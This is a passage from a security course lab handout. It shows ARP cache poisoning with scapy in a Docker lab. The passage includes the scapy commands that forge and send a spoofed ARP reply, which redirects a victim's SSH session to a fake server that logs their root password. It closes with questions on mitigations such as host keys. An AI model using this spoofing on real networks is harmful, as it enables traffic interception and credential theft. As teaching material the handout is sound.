     hwsrc     = 02:42:ac:14:00:06
     psrc      = 172.20.0.6
     hwdst     = 02:42:ac:14:00:07
     pdst      = 172.20.0.7

>>> victim_mac = result[0].src
----
<1> This is my MAC address of victim, but yours may be different!

This is how an ARP exchange is supposed to work.
We broadcast out asking what MAC we should use for a certain IP and we get a response _from the person who legitimately has that MAC and IP_.

We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:

.attacker
[source, text]
----
>>> victim_ip, victim_mac, server_ip, server_mac
('172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05')
----

Now let's make and view an evil ARP packet:

.attacker
[source, text]
----
>>> bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)
>>> bad_arp
<ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |>
----

This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours (by default, we don't specify with `hwsrc`).
This means the victim will update their ARP cache such that frames destined for server go to attacker.
This effectively reroutes all layer 2 traffic that was going to the server from the victim.

Go ahead an send that ARP packet:

.attacker
[source, text]
----
>>> send(bad_arp)
.
Sent 1 packets.
----

Now go back to the victim terminal with the SSH connection to server and try typing something.
As soon as SSH has to send data, you will get a broken pipe error and the connection will drop.
Faced with such a problem, what do you think most users will do?
Probably try to reconnect, let's try that too.
Remember the password is "password".

.victim
[source, text]
----
You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
Leave this connection open while you experiment with scapy from 'attacker'.
bf9ebe42a108:~# client_loop: send disconnect: Broken pipe <1>
bash-5.0# ssh server
Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
root@server's password:
#
----
<1> This happened when they tried to type something right after we sent the malicious ARP

Wait, that prompt looks a little different and where's the message about staying logged in?
It turns out the victim actually signed into our fake SSH server and their username and password were logged!
Take a look at the output from the terminal running `docker-compose up`, you'll see the credentials entered:

.docker-compose up terminal
[source, text]
----
attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted
----

[IMPORTANT.deliverable]
====

[qanda]
How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?::
    {empty}
Would using keys instead of passwords help prevent this kind of attack? Why or why not?::
    {empty}
How would https://www.ssh.com/academy/ssh/host-key[managing host keys correctly] prevent this kind of attack?::
    {empty}

====

To stop the running containers, you can type Ctrl-C in the terminal running `docker-compose up`, exit out of the victim, and exit out of the attacker.

[#attacks_review]
== Review Questions

[qanda]
What can MAC address spoofing allow an attacker to do? What steps can be taken to mitigate this risk?::
    {empty}
What is the difference between horizontal and vertical privilege escalation? Give an example of each.::
    {empty}
What is XSS and how can it be used in an attack?::
    {empty}
